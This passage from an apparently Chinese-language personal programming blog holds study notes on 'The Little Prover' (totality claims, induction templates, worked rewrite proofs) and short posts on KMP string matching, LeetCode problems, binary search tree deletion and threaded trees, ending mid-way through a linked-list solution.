‘t)) (dethm natp+ (x y) (if (natp x) (if (natp y) (equal (natp (+ x y)) ‘t) ‘t) ‘t)) (dethm common-addends-\u0026lt; (x y z) (equal (\u0026lt; (+ x z) (+ y z)) (\u0026lt; x y))) 怎麼用theorem 要改寫用的equal只能在if-answer或if-else，同時該equal不能出現在if-question或function call的參數中．\n(dethm ?? (x) (if (A x) (if (B x) (equal (F1 x) \u0026#39;1) (equal (F2 x) \u0026#39;2)) (if (C x) (equal (F3 x) \u0026#39;3) (equal (F4 x) \u0026#39;4)))) (cons \u0026#39;gyre (if (C \u0026#39;(callooh callay)) (cons \u0026#39;gimble (if (A \u0026#39;(callooh callay)) (cons \u0026#39;1 \u0026#39;(outgrabe)) (cons \u0026#39;3 \u0026#39;(wabe)))) (cons (F4 \u0026#39;(callooh callay)) \u0026#39;(vorpal)))) 試著用??來改寫這個式子．\n(F4 '(callooh callay))能被改寫成’4嗎？\n有C的前提，同時該位置也在if-else，但是沒有A的前提，所以不行．\n那1與3可以改寫成(F1 …)與(F2 …)嗎？\n可以！！\nA與C的前提都有，同時都在相對應的位置上，所以可以．\n要total才行，partial function (defun partial (x) (if (partial x) \u0026#39;nil \u0026#39;t)) (dethm contradiction () 'nil)\n‘nil -\u0026gt; if-same\n(if (partial x) nil nil) -\u0026gt; if-nest-A (enlarge\n(if (partial x) (if (partial x) nil t) ‘nil) -\u0026gt; if-nest-E (enlarge\n(if (partial x) (if (partial x) nil t) (if (partial x) t nil)) -\u0026gt; expand(use) (partial x) (self-reference)\n(if (partial x) (if (if (partial x) nil t) nil t) (if (if (partial x) nil t) t nil)) -\u0026gt; if-nest-A \u0026amp; if-nest-E (shrink\n(if (....) (if nil nil t) (if t t nil)) -\u0026gt; t\nmeasure measure，追蹤某個參數的長度 (證明遞迴會收斂)\n(defun sub (x y) (if (atom y) (if (equal y \u0026#39;?) x y) (cons (sub x (car y)) (sub x (cdr y))))) measure: (size y) totality claim\n(if (natp (size x)) (if (atom x) \u0026#39;t (\u0026lt; (size (cdr x)) (size x))) \u0026#39;nil) If Lifting (A (if x y z)) -\u0026gt; (if x (A y) (A z))\n(ctx (focus (if Q A E))) =\u0026gt; if-same\n(ctx (if Q (focus (if Q A E)) (focus (if Q A E)))) =\u0026gt; if-next-A\u0026amp;E\n(ctx (if Q (focus A) (focus E))) 做Totality Claims (defun add-atoms (x ys) (if (atom x) (if (member? x ys) ys (cons x ys)) (add-atoms (car x) (add-atoms (cdr x) ys)))) 基本上就是把每一次遞迴所apply的參數，apply到measure去，同時寫下這次遞迴比原本的measure小\n針對每個case建分支 (if (atom x) ... ...) 找自己的遞迴，沒有的直接換成\u0026rsquo;t (if (atom x) \u0026#39;t ...) 從第一個遞迴開始轉成measure，measure參數代此遞迴的參數，如果不只一個就用if包起來 (if (atom x) \u0026#39;t (if (\u0026lt; (size (car x)) (size x)) (\u0026lt; (size (cdr x)) (size x)) nil)) 最後用natp包起來(證明size是自然數) (if (natp (size x)) (if (atom x) \u0026#39;t (if (\u0026lt; (size (car x)) (size x)) (\u0026lt; (size (cdr x)) (size x)) \u0026#39;nil)) \u0026#39;nil) 做induction template (defun set? (xs) (if (atom xs) \u0026#39;t (if (member? (car xs) (cdr xs)) \u0026#39;nil (set? (cdr xs))))) (defun add-atoms (x ys) (if (atom x) (if (member? x ys) ys (cons x ys)) (add-atoms (car x) (add-atoms (cdr x) ys)))) (dethm set?/add-atoms (a) (equal (set? (add-atoms a \u0026#39;())) \u0026#39;t)) 把所有東西參數化 (equal (set? (add-atoms a bs)) \u0026#39;t) 分析裡面的參數，讓他在所有情況下都會成立 先從bs開始，因為在add-atoms裡面他沒有涉及到遞迴的部分，比較簡單\n要怎麼讓(equal (set? (add-atoms a bs)) 't)成立? bs要讓set?為\u0026rsquo;t\n讓主體的前提滿足 (if (set? bs) (equal (set? (add-atoms a bs)) \u0026#39;t) \u0026#39;t)) 只要有bs都會有這一段，等一下還會看到很多次\n接著是a，他有兩個case\natom，沒有遞迴，直接抄前面的\n(if (atom a) (if (set? bs) (equal (set? (add-atoms a bs)) \u0026#39;t) \u0026#39;t)) ...) list，有遞迴裡面有遞迴!! (add-atoms (car x) (add-atoms (cdr x) ys))\n先處理最外面的add-atoms，直接把(car x)與(add-atoms (cdr x) ys)當成input，試著讓我們要證的東西成立\n(if (set? (add-atoms (cdr x) ys)) (equal (set? (add-atoms (car x) (add-atoms (cdr x) ys))) \u0026#39;t) \u0026#39;t)) 剛剛是第一個前提，接著是(add-atoms (cdr x) ys)，用同樣的方法\n(if (set? (cdr x)) (equal (set? (add-atoms (cdr x) ys) \u0026#39;t) \u0026#39;t)) 這是第二個前提，我們把所有前依據以順序組合在一起(用if)\n(if (atom a) (if (set? bs) (equal (set? (add-atoms a bs)) \u0026#39;t) \u0026#39;t) (if (if (set? (add-atoms (cdr x) ys)) (equal (set? (add-atoms (car x) (add-atoms (cdr x) ys))) \u0026#39;t) \u0026#39;t) (if (if (set? (cdr x)) (equal (set? (add-atoms (cdr x) ys) \u0026#39;t) \u0026#39;t)) ... \u0026#39;t))) 最後的\u0026hellip;，就是我們在這個case原本想證的東西\n(if (atom a) (if (set? bs) (equal (set? (add-atoms a bs)) \u0026#39;t) \u0026#39;t) (if (if (set? (add-atoms (cdr x) ys)) (equal (set? (add-atoms (car x) (add-atoms (cdr x) ys))) \u0026#39;t) \u0026#39;t) (if (if (set? (cdr x)) (equal (set? (add-atoms (cdr x) ys) \u0026#39;t) \u0026#39;t)) (if (set? bs) (equal (set? (add-atoms a bs)) \u0026#39;t) \u0026#39;t)) \u0026#39;t))) 等等，有些變數對不上啊 其實變數就依據case的變數去改就好，alpha reduction\n(if (atom x) (if (set? ys) (equal (set? (add-atoms a ys)) \u0026#39;t) \u0026#39;t) (if (if (set? (add-atoms (cdr x) ys)) (equal (set? (add-atoms (car x) (add-atoms (cdr x) ys))) \u0026#39;t) \u0026#39;t) (if (if (set? (cdr x)) (equal (set? (add-atoms (cdr x) ys) \u0026#39;t) \u0026#39;t)) (if (set? ys) (equal (set? (add-atoms x ys)) \u0026#39;t) \u0026#39;t)) \u0026#39;t))) 看到這裡，會發現totality claim與induction template的做法其實很像\n分析case 從被遞迴的input開始，切case 沒遞迴的case就是滿足其他參數的條件，包好就完成沒遞迴的case 遞迴的case要從最外層的遞迴一層一層建，建法與沒遞迴的case的結果很像，不過參數要代成遞迴時代入的參數 把所有前提寫完，就把要證的帶進去，當然要注意其他參數的條件要滿足!! 這邊附上兩個常見template\nProof by List Induction measure: (size x)\n(if (atom x) C (if Ccdr C \u0026#39;t)) Proof by Star Induction measure: (size x)\n(if (atom x) C (if Ccar (if Ccdr C t) \u0026#39;t)) Insights 選好做的 But some approaches will find a proof faster than others.\n(equal (if (equal (first-of (cons a (cons \u0026#39;? \u0026#39;()))) \u0026#39;?) \u0026#39;t (equal (second-of (cons a (cons \u0026#39;? \u0026#39;()))) ?)) ‘t) 如果從second-of開始改寫，會變成’t，就可以if-same再改成’t\n這樣就不用管first-of如何．\nInsight: Rewrite from the Inside Out 從if-ans,if-else, arg來改寫，再apply func，如果真的不行了，再改寫外部．\nInsight: Pull Ifs Outward 當if被func或其他if包起來時，用if lifting把if拉出來．\nInsight: Keep Theorems in Mind 看到可以用的就用，看到很像的，想辦法改寫到可以用．\nInsight: Don’t Touch Inductive Premises 歸納前提就是重點，不要動\n如果不能用，也許是\n用錯歸納法template了 需要其他lemma Insight: Combine Ifs 用if lifting把if條件中的if拿出來\nInsight: Create Helpers for Induction To rewrite the application of a recursive function, prove a separate theorem about the recursive function using induction. Do this if the current proof either does not use induction, or uses induction for a different kind of recursion from the function, or uses induction on different arguments from the application.\nInsight: Create Helpers for Repetition If a proof performs similar sequences of steps over and over, state a theorem that can perform the same rewrite as those steps via the Law of Dethm. Use that theorem in place of the sequence of steps to shorten the proof.\nproof for memb?/remb (defun remb (xs) (if (atom xs) \u0026#39;() (if (equal (car xs) \u0026#39;?) (remb (cdr xs)) (cons (car xs) (remb (cdr xs)))))) (defun memb? (xs) (if (atom xs) \u0026#39;nil (if (equal (car xs) \u0026#39;?) \u0026#39;t (memb? (cdr xs))))) (dethm memb?/remb (xs) (equal (memb? (remb xs)) \u0026#39;nil)) the inductive claim\n(if (atom xs) (equal (memb? (remb xs)) \u0026#39;nil) (if (equal (memb? (remb (cdr xs))) \u0026#39;nil) (equal (memb? (remb xs)) \u0026#39;nil) \u0026#39;t)) 先從(atom xs)的if-ans開始\n(if (atom xs) (equal (memb? (if (atom xs) ‘() (if (equal (car xs) ‘?) (remb (cdr xs)) (cons (car xs) (remb (cdr xs)))))) nil) ...) -\u0026gt; if-nest-A\n(if (atom xs) (equal (memb? ‘()) nil) ...) -\u0026gt; expand memb? \u0026amp; atom \u0026amp; if-true\n(if (atom xs) \u0026#39;t ...) 接著是not (atom xs)與(equal (memb? (remb (cdr xs))) nil)\n(equal (memb? (remb xs)) nil)\n-\u0026gt; remb\n(equal (memb? (if (atom xs) ‘() (if (equal (car xs) ‘?) (remb (cdr xs) (cons (car xs) (remb (cdr xs))))) nil) -\u0026gt; if-nest-E \u0026amp; if lifting for memb?\n(equal (if (equal (car xs) ‘?) (memb? (remb (cdr xs)) (memb? (cons (car xs) (remb (cdr xs))))) nil) -\u0026gt; inductive premise\n(equal (if (equal (car xs) ‘?) nil (memb? (cons (car xs) (remb (cdr xs))))) nil) -\u0026gt; memb?\n(equal (if (equal (car xs) ‘?) nil (if (atom (cons (car xs) (remb (cdr xs)))) ‘nil (if (equal (car (cons (car xs) (remb (cdr xs)))) ‘?) ‘t (memb? (cdr (cons (car xs) (remb (cdr xs))))))) nil) -\u0026gt; atom/cons \u0026amp; if-false\n(equal (if (equal (car xs) ‘?) nil (if (equal (car (cons (car xs) (remb (cdr xs)))) ‘?) ‘t (memb? (cdr (cons (car xs) (remb (cdr xs)))))) nil) -\u0026gt; car/cons \u0026amp; if-false \u0026amp; cdr/cons \u0026amp; inductive premise\n(equal (if (...) nil nil) nil) -\u0026gt; if-same \u0026amp; equal-same\nt proof for ctx?/sub (defun ctx? (x) (if (atom x) (equal x \u0026#39;?) (if (ctx? (car x)) \u0026#39;t (ctx? (cdr x))))) (defun sub (x y) (if (atom y) (if (equal y \u0026#39;?) x y) (cons (sub x (car y)) (sub x (cdr y))))) 證\n(dethm ctx?/sub (x y) (if (ctx? x) (if (ctx? y) (equal (ctx? (sub x y)) \u0026#39;t) \u0026#39;t) \u0026#39;t)) 把body填入templete(有夠噁心的\n(if (atom y) (if (ctx? x) (if (ctx? y) (equal (ctx? (sub x y)) \u0026#39;t) \u0026#39;t) \u0026#39;t) (if (if (ctx? x) (if (ctx? (car y)) (equal (ctx? (sub x (car y))) \u0026#39;t) \u0026#39;t) \u0026#39;t) (if (if (ctx? x) (if (ctx? (cdr y)) (equal (ctx? (sub x (cdr y))) \u0026#39;t) \u0026#39;t) ‘t) (if (ctx? x) (if (ctx? y) (equal (ctx? (sub x y)) \u0026#39;t) \u0026#39;t) \u0026#39;t) \u0026#39;t) ‘t)) 先看到有一堆(if (ctx? x)，用if lifting抽出來(這裡就不好用(A (if …)) -\u0026gt; (if (A ….))來理解，要用if-same來做就很直覺)\n同時把if-else的部分用if-same去掉\n(if (ctx? x) (if (atom y) (if (ctx? y) (equal (ctx? (sub x y)) \u0026#39;t) \u0026#39;t) (if (if (ctx? (car y)) (equal (ctx? (sub x (car y))) \u0026#39;t) \u0026#39;t) (if (if (ctx? (cdr y)) (equal (ctx? (sub x (cdr y))) \u0026#39;t) \u0026#39;t) (if (ctx? y) (equal (ctx? (sub x y)) \u0026#39;t) \u0026#39;t) \u0026#39;t) ‘t)) \u0026#39;t) 對sub用if-nest-A\n(if (ctx? x) (if (atom y) (if (ctx? y) (equal (ctx? (if (equal y \u0026#39;?) x y)) \u0026#39;t) \u0026#39;t) (if (if (ctx? (car y)) (equal (ctx? (sub x (car y))) \u0026#39;t) \u0026#39;t) (if (if (ctx? (cdr y)) (equal (ctx? (sub x (cdr y))) \u0026#39;t) \u0026#39;t) (if (ctx? y) (equal (ctx? (sub x y)) \u0026#39;t) \u0026#39;t) \u0026#39;t) ‘t)) \u0026#39;t) if lifting\n(if (ctx? x) ;; 可以用這個改寫成’t嗎 (if (atom y) (if (ctx? y) (if (equal y \u0026#39;?) (equal (ctx? x) \u0026#39;t) ;; 不行，(ctx? x)可以是’t以外的東西(total)，也沒定理 (equal (ctx? y) \u0026#39;t)) \u0026#39;t) (if (if (ctx? (car y)) (equal (ctx? (sub x (car y))) \u0026#39;t) \u0026#39;t) (if (if (ctx? (cdr y)) (equal (ctx? (sub x (cdr y))) \u0026#39;t) \u0026#39;t) (if (ctx? y) (equal (ctx? (sub x y)) \u0026#39;t) \u0026#39;t) \u0026#39;t) ‘t)) \u0026#39;t) 但ctx?只會回傳’t或’nil而且如果我們有這種定理的話？\n(dethm ctx?/t (x) (if (ctx? x) (equal (ctx? x) ‘t) ‘t)) 那就可以改寫了\n(if (ctx? x) (if (atom y) (if (ctx? y) (if (equal y \u0026#39;?) ‘t ‘t)) \u0026#39;t) (if (if (ctx? (car y)) (equal (ctx? (sub x (car y))) \u0026#39;t) \u0026#39;t) (if (if (ctx? (cdr y)) (equal (ctx? (sub x (cdr y))) \u0026#39;t) \u0026#39;t) (if (ctx? y) (equal (ctx? (sub x y)) \u0026#39;t) \u0026#39;t) \u0026#39;t) ‘t)) \u0026#39;t) if-same*2\n(if (ctx? x) (if (atom y) ‘t (if (if (ctx? (car y)) (equal (ctx? (sub x (car y))) \u0026#39;t) \u0026#39;t) (if (if (ctx? (cdr y)) (equal (ctx? (sub x (cdr y))) \u0026#39;t) \u0026#39;t) (if (ctx? y) (equal (ctx? (sub x y) \u0026#39;t) \u0026#39;t) \u0026#39;t) ‘t)) \u0026#39;t) atom與if-nest-E\n(if (ctx? x) (if (atom y) ‘t (if (if (ctx? (car y)) (equal (ctx? (sub x (car y))) \u0026#39;t) \u0026#39;t) (if (if (ctx? (cdr y)) (equal (ctx? (sub x (cdr y))) \u0026#39;t) \u0026#39;t) (if (ctx? y) (equal (ctx? (cons (sub x (car y)) (sub (cdr y)))) \u0026#39;t) \u0026#39;t) \u0026#39;t) ‘t)) \u0026#39;t) ctx?\n(if (ctx? x) (if (atom y) ‘t (if (if (ctx? (car y)) (equal (ctx? (sub x (car y))) \u0026#39;t) \u0026#39;t) (if (if (ctx? (cdr y)) (equal (ctx? (sub x (cdr y))) \u0026#39;t) \u0026#39;t) (if (ctx? y) (equal (if (ctx? (sub x (car y))) ‘t (ctx? (sub x (cdr y)))) \u0026#39;t) \u0026#39;t) \u0026#39;t) ‘t)) \u0026#39;t) ctx?\n(if (ctx? x) (if (atom y) ‘t (if (if (ctx? (car y)) ;; here (equal (ctx? (sub x (car y))) \u0026#39;t) \u0026#39;t) (if (if (ctx? (cdr y)) (equal (ctx? (sub x (cdr y))) \u0026#39;t) \u0026#39;t) (if (if (ctx? (car y)) ;; here ‘t (ctx? (cdr y))) (equal (if (ctx? (sub x (car y))) ‘t (ctx? (sub x (cdr y)))) \u0026#39;t) \u0026#39;t) \u0026#39;t) ‘t)) \u0026#39;t) if lifting\n(if (ctx? x) (if (atom y) ‘t (if (ctx? (car y)) (if (equal (ctx? (sub x (car y))) \u0026#39;t);; inductive promsing!! (if (if (ctx? (cdr y)) (equal (ctx? (sub x (cdr y))) \u0026#39;t) \u0026#39;t) (equal (if (ctx? (sub x (car y))) ‘t (ctx? (sub x (cdr y)))) \u0026#39;t) \u0026#39;t) (if (if (ctx? (cdr y)) (equal (ctx? (sub x (cdr y))) \u0026#39;t) \u0026#39;t) (if (ctx? (cdr y)) (equal (if (ctx? (sub x (car y))) ‘t (ctx? (sub x (cdr y)))) \u0026#39;t) \u0026#39;t) ‘t)))) \u0026#39;t) inductive promsing\n(if (ctx? x) (if (atom y) ‘t (if (ctx? (car y)) t (if (if (ctx? (cdr y)) (equal (ctx? (sub x (cdr y))) \u0026#39;t) \u0026#39;t) (if (ctx? (cdr y)) (equal (if (ctx? (sub x (car y))) ‘t (ctx? (sub x (cdr y)))) \u0026#39;t) \u0026#39;t) ‘t))) \u0026#39;t) if lifting\n(if (ctx? x) (if (atom y) ‘t (if (ctx? (car y)) t (if (ctx? (cdr y)) (if (equal (ctx? (sub x (cdr y))) \u0026#39;t) ;; inductive promsing!! (equal (if (ctx? (sub x (car y))) ‘t (ctx? (sub x (cdr y)))) ‘t) \u0026#39;t) ‘t))) \u0026#39;t) inductive promsing \u0026amp; if-same \u0026amp; if-true\nt (剩下的那一個，就pass，打這個好累)\n發現有許多差不多的前提，用if-nest-A/E或if lifting把他們化簡\n把inductive promise湊出來\n一次化簡或處理一個case\nproof for set?/add-atoms if lifting is our friend.\n(atom case) add-atoms, if-nest-A, (atom a)\n(if (atom a) (if (set? bs) (equal (set? (if (member? a bs) bs (cons a bs))) ‘t) ‘t) (if (if (set? (add-atoms (cdr x) bs)) (equal (set? (add-atoms (car x) (add-atoms (cdr x) bs))) ‘t) ‘t) (if (if (set? bs) (equal (set? (add-atoms (cdr x) bs)) ‘t) ‘t) (if (set? bs) (equal (set? (add-atoms a bs)) ‘t) ‘t) ‘t) ‘t)) if lifting, promise (another claim)\n(if (atom a) (if (set? bs) (equal (if (member? a bs) (set? bs) (set? (cons a bs))) ‘t) ‘t) (if (if (set? (add-atoms (cdr x) bs)) (equal (set? (add-atoms (car x) (add-atoms (cdr x) bs))) ‘t) ‘t) (if (if (set? bs) (equal (set? (add-atoms (cdr x) bs)) ‘t) ‘t) (if (set? bs) (equal (set? (add-atoms a bs)) ‘t) ‘t) ‘t) ‘t)) set?, member?, if-nest-E, if-same, equal, if-same\n(if (atom a) \u0026#39;t (if (if (set? (add-atoms (cdr x) bs)) (equal (set? (add-atoms (car x) (add-atoms (cdr x) bs))) ‘t) ‘t) (if (if (set? bs) (equal (set? (add-atoms (cdr x) bs)) ‘t) ‘t) (if (set? bs) (equal (set? (add-atoms a bs)) ‘t) ‘t) ‘t) ‘t)) if lifting\n(if (atom a) \u0026#39;t (if (if (set? (add-atoms (cdr x) bs)) (equal (set? (add-atoms (car x) (add-atoms (cdr x) bs))) ‘t) ‘t) (if (set? bs) (if (equal (set? (add-atoms (cdr x) bs)) ‘t) (equal (set? (add-atoms a bs)) ‘t) ‘t) \u0026#39;t) ‘t)) if lifting again!!\n(if (atom a) \u0026#39;t (if (set? bs) (if (if (set? (add-atoms (cdr x) bs)) (equal (set? (add-atoms (car x) (add-atoms (cdr x) bs))) ‘t) ‘t) (if (equal (set? (add-atoms (cdr x) bs)) ‘t) (equal (set? (add-atoms a bs)) ‘t) ‘t) ‘t) \u0026#39;t)) if lifting\n(if (atom a) \u0026#39;t (if (set? bs) (if (set? (add-atoms (cdr x) bs)) ;;可以用嗎？ (if (equal (set? (add-atoms (car x) (add-atoms (cdr x) bs))) ‘t) (if (equal (set? (add-atoms (cdr x) bs)) ‘t) (equal (set? (add-atoms a bs)) ‘t) ‘t) ‘t) (if (equal (set? (add-atoms (cdr x) bs)) ‘t) ;; need a new claim (equal (set? (add-atoms a bs)) ‘t) ‘t)) \u0026#39;t)) (dethm set?/nil (xs) (if (set? xs) ‘t (equal (set? xs) ‘nil))) set?/nil \u0026amp; set?/t\n(if (atom a) \u0026#39;t (if (set? bs) (if (set? (add-atoms (cdr x) bs)) ;;用!! (if (equal (set? (add-atoms (car x) (add-atoms (cdr x) bs))) ‘t) (if (equal ‘t ‘t) (equal (set? (add-atoms a bs)) ‘t) ‘t) ‘t) (if (equal ‘nil ‘t) (equal (set? (add-atoms a bs)) ‘t) ‘t)) \u0026#39;t)) equal\n(if (atom a) \u0026#39;t (if (set? bs) (if (set? (add-atoms (cdr x) bs)) (if (equal (set? (add-atoms (car x) (add-atoms (cdr x) bs))) ‘t) (equal (set? (add-atoms a bs)) ‘t) ‘t) t) \u0026#39;t)) add-atoms \u0026amp; if-nest-E\n(if (atom a) \u0026#39;t (if (set? bs) (if (set? (add-atoms (cdr x) bs)) ;;用!! (if (equal (set? (add-atoms (car x) (add-atoms (cdr x) bs))) ‘t) (equal (set? (add-atoms (car x) (add-atoms (cdr x) bs))) ‘t) ‘t) t) \u0026#39;t)) promise\nt 證原本要證的\n(dethm set?/atoms (a) (equal (set? (atoms a)) \u0026#39;t)) 先把(atoms a)換成(add-atoms a ‘())\n(equal (set? (dad-atoms a ‘())) 't)\n要有(set? xs)，才能用set?/add-atoms\nif-true\n(if t (equal (set? (add-atoms a ‘())) \u0026#39;t) t) if-true\n(if (if t t (if (member? (car ‘()) (cdr ‘())) nil (set? (cdr ‘())))) (equal (set? (add-atoms a ‘())) \u0026#39;t) t) (equal t (atom ())\n(if (if (atom ()) t (if (member? (car ‘()) (cdr ‘())) nil (set? (cdr ‘())))) (equal (set? (add-atoms a ‘())) \u0026#39;t) t) set?\n(if (set? ()) (equal (set? (add-atoms a ‘())) \u0026#39;t) t) set?/add-atoms\nt Ch10 different measure \u0026amp; change the promise (defun rotate (x) (cons (car (car x)) (cons (cdr (car x)) (cdr x)))) (defun align (x) (if (atom x) x (if (atom (car x)) (cons (car x) (align (cdr x))) (align (rotate x))))) (size x) ?? align的長度都一樣，需要別的measure\n(defun wt (x) (if (atom x) \u0026#39;1 (+ (+ (wt (car x)) (wt (car x))) (wt (cdr x))))) measure: (size x) totality claim是\n(if (natp (wt x)) (if (atom x) \u0026#39;t (if (atom (car x)) (\u0026lt; (wt (cdr x)) (wt x)) (\u0026lt; (wt (rotate x)) (wt x)))) \u0026#39;nil) (dethm natp/wt (x) (equal (natp (wt x)) \u0026#39;t)) (if (natp (size x)) (if (atom x) \u0026#39;t (if (atom (car x)) (\u0026lt; (wt (cdr x)) (wt x)) (\u0026lt; (wt (rotate x)) (wt x)))) \u0026#39;nil) =\u0026gt; natp/wt\n(if (atom x) \u0026#39;t (if (atom (car x)) (\u0026lt; (wt (cdr x)) (wt x)) (\u0026lt; (wt (rotate x)) (wt x)))) =\u0026gt; wt\n(if (atom x) \u0026#39;t (if (atom (car x)) (\u0026lt; (wt (cdr x)) (+ (+ (wt (car x)) (wt (car x))) (wt (cdr x)))) (\u0026lt; (wt (rotate x)) (wt x)))) =\u0026gt; if-true, natp/wt\n(if (atom x) \u0026#39;t (if (atom (car x)) (if (natp (wt (cdr x))) (\u0026lt; (wt (cdr x)) (+ (+ (wt (car x)) (wt (car x))) (wt (cdr x)))) t) (\u0026lt; (wt (rotate x)) (wt x)))) =\u0026gt; identity-+, common-addends-\u0026lt;\n(if (atom x) \u0026#39;t (if (atom (car x)) (if (natp (wt (cdr x))) (\u0026lt; 0 (+ (wt (car x)) (wt (car x))))) t) (\u0026lt; (wt (rotate x)) (wt x)))) =\u0026gt; change promise (natp (wt (cdr x))) -\u0026gt; t -\u0026gt; (equal (\u0026lt; ‘0 (wt x))) t)\n(if (atom x) \u0026#39;t (if (atom (car x)) (if (\u0026lt; ‘0 (wt (car x)))) (\u0026lt; 0 (+ (wt (car x)) (wt (car x))))) t) (\u0026lt; (wt (rotate x)) (wt x)))) =\u0026gt; positive-+\n(e04, 後面的很長，pass)\n最後還有一個align/align，但就是之前的綜合體，不過歸納template要自己生，至於證明就不展開了太長了!!\n(defun align (x) (if (atom x) x (if (atom (car x)) (cons (car x) (align (cdr x))) (align (rotate x))))) (dethm align/align (x) (equal (align (align x)) (align x))) (if (atom x) (equal (align (align x)) (align x)) (if (atom (car x)) (if (equal (align (align (cdr x))) (align (cdr x))) (equal (align (align x)) (align x)) \u0026#39;t) (if (equal (align (align (rotate x))) (align (rotate x))) (equal (align (align x)) (align x)) \u0026#39;t))) J-Bob TODO\n有時間會補!!\n","permalink":"https://littlebees.github.io/2021/07/the-little-prover-%E7%AD%86%E8%A8%98/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e久遠筆記搬到github這裡，不過也是改寫超多東西的\u003c/p\u003e","title":"The little prover 筆記"},{"content":"動機 雖然說現在它的主場只存在於課本中，但好像還是有人喜歡問\u0026hellip; 改成用遞迴比較好懂\n之後還有Boyer–Moore algorithm阿 good suffix真的不好懂\nnaive 每次失敗就從頭開始\ndef fail(j): return 0 def match(s,p): j = 0 i = 0 while i \u0026lt; len(s): if j == len(p): print(\u0026#34;match at {}\u0026#34;.format(i)) return elif s[i] == p[j]: j += 1 i += 1 elif j == 0: i += 1 else: j = fail(j) print(\u0026#34;no match\u0026#34;) Knuth-Morris-Pratt algorithm 如果pattern裡面有重複的，可以移過去!! 像是abababb，如果在最後一個a出事，下一個應該要從第二個的前一位開始\n所以我們假設fail給到目前為止成功的位置，會給出下一次要從哪邊開始 有兩個case\n在起點(0)成功或是失敗，就是從頭開始 在其他地方成功 往已經比完的地方看，一直往前看給出的下一個位置的字是不是與比對成功的字一樣 一樣就可以回傳該位置加一(字一樣會比對失敗，所以要下一位) 不一樣就是比對失敗，從頭開始，也因為loop的條件，所以只要一直不一樣最後就會是0 @functools.lru_cache(None) def fail(p,i): if i \u0026lt;= 0: return 0 else: j = fail(i-1) while j \u0026gt; 0 and p[j] != p[i]: j = fail(j-1) return j+(1 if p[j] == p[i] else 0) def match(s,p): j = 0 i = 0 while i \u0026lt; len(s): if j == len(p): print(\u0026#34;match at {}\u0026#34;.format(i)) return elif s[i] == p[j]: j += 1 i += 1 elif j == 0: i += 1 else: j = fail(j-1) print(\u0026#34;no match\u0026#34;) ","permalink":"https://littlebees.github.io/2021/07/kmp-algorithm/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e雖然說現在它的主場只存在於課本中，但好像還是有人喜歡問\u0026hellip;\n改成用遞迴比較好懂\u003c/p\u003e\n\u003cp\u003e之後還有Boyer–Moore algorithm阿\ngood suffix真的不好懂\u003c/p\u003e","title":"kmp-algorithm"},{"content":"動機 久違的leetcode\nProblem Given an array of n integers nums, a 132 pattern is a subsequence of three integers nums[i], nums[j] and nums[k] such that i \u003c j \u003c k and nums[i] \u003c nums[k] \u003c nums[j].\nReturn true if there is a 132 pattern in nums, otherwise, return false.\nExample 1:\nInput: nums = [1,2,3,4]Output: falseExplanation: There is no 132 pattern in the sequence.Example 2:\nInput: nums = [3,1,4,2]Output: trueExplanation: There is a 132 pattern in the sequence: [1, 4, 2].Example 3:\nInput: nums = [-1,3,2,0]Output: trueExplanation: There are three 132 patterns in the sequence: [-1, 3, 2], [-1, 3, 0] and [-1, 2, 0]. Constraints:\nn == nums.length1 \u003c= n \u003c= 2 * 105-109 \u003c= nums[i] \u003c= 109 Sol class Solution: def find132pattern(self, nums: List[int]) -\u0026gt; bool: stk = [] mid = float(\u0026#39;-inf\u0026#39;) for n in reversed(nums): if n \u0026lt; mid and stk: return True while stk and stk[-1] \u0026lt; n: mid = max(mid,stk.pop()) stk += n, return False ","permalink":"https://littlebees.github.io/2021/07/leetcode-456-132-pattern/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e久違的leetcode\u003c/p\u003e","title":"leetcode-456 - 132 Pattern"},{"content":"動機 剛好看到，紀錄一下\ndelete class Solution: def deleteNode(self, root: Optional[TreeNode], key: int) -\u0026gt; Optional[TreeNode]: if not root: return None elif root.val \u0026gt; key: root.left = self.deleteNode(root.left, key) return root elif root.val \u0026lt; key: root.right = self.deleteNode(root.right, key) return root else: if not root.left and not root.right: return None elif not root.left: return root.right elif not root.right: return root.left else: # find min in root.right now = root.right prev = root while now.left: prev, now = now, now.left if now == root.right: # no left now.left = root.left else: prev.left = now.right now.left = root.left now.right = root.right return now threading binary tree 不用遞迴與stack完成inorder走訪，雖然說放這裡感覺與bst無關，不過我暫時想不到放哪就先這樣\n就是在inorder走訪時，想像像linked list一樣，有一個prev，之後就是開始連接，修prev與現在的node 左邊指回去，右邊指回來 (其實要反過來應該也可以)\n中序 class Node: def __init__(self): self.is_left = self.is_right = True self.left = self.right = None def threading(root,prev = None): if root is None: return else: threading(root.left, prev) # left 指回去 if root.left is None: root.is_left = False root.left = prev # right 指回來，變成一個圈 if prev is not None: prev.is_right = False prev.right = root threading(root.right, root) 前序 def pre(root,prev): if root: originRight = root.right pro = pre(root.left, root) ret = pre(originRight, pro) if prev: prev.left, prev.right = None, root # 目前最大的node if not pro and not ret: return root elif not pro or not ret: return [x for x in [pro,ret] if x][0] else: return ret else: return None pre(root, None) ","permalink":"https://littlebees.github.io/2021/07/bst%E7%9A%84faq/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e剛好看到，紀錄一下\u003c/p\u003e","title":"bst的faq"},{"content":"動機 之前寫的很爛，居然還用到例外!? 所以重寫\nProblem Given a linked list, reverse the nodes of a linked list k at a time and return its modified list.\nk is a positive integer and is less than or equal to the length of the linked list. If the number of nodes is not a multiple of k then left-out nodes, in the end, should remain as it is.\nYou may not alter the values in the list's nodes, only nodes themselves may be changed.\nExample 1:\nInput: head = [1,2,3,4,5], k = 2Output: [2,1,4,3,5]Example 2:\nInput: head = [1,2,3,4,5], k = 3Output: [3,2,1,4,5]Example 3:\nInput: head = [1,2,3,4,5], k = 1Output: [1,2,3,4,5]Example 4:\nInput: head = [1], k = 1Output: [1] Constraints:\nThe number of nodes in the list is in the range sz.1 \u003c= sz \u003c= 50000 \u003c= Node.val \u003c= 10001 \u003c= k \u003c= sz Follow-up: Can you solve the problem in O(1) extra memory space? Sol 這題其實把reverse，a到b的部分寫出來就幾乎完成了，可以看這裡有解釋\n剩下就是把group的起終點找出來再丟到reverse就ok了\ndef reverseKGroup(self, head: ListNode, k: int) -\u0026gt; ListNode: def rev(a,b): # [a,b) ptr = a ptr_next = a.next a.next = None while ptr_next is not b: tmp = ptr_next.next 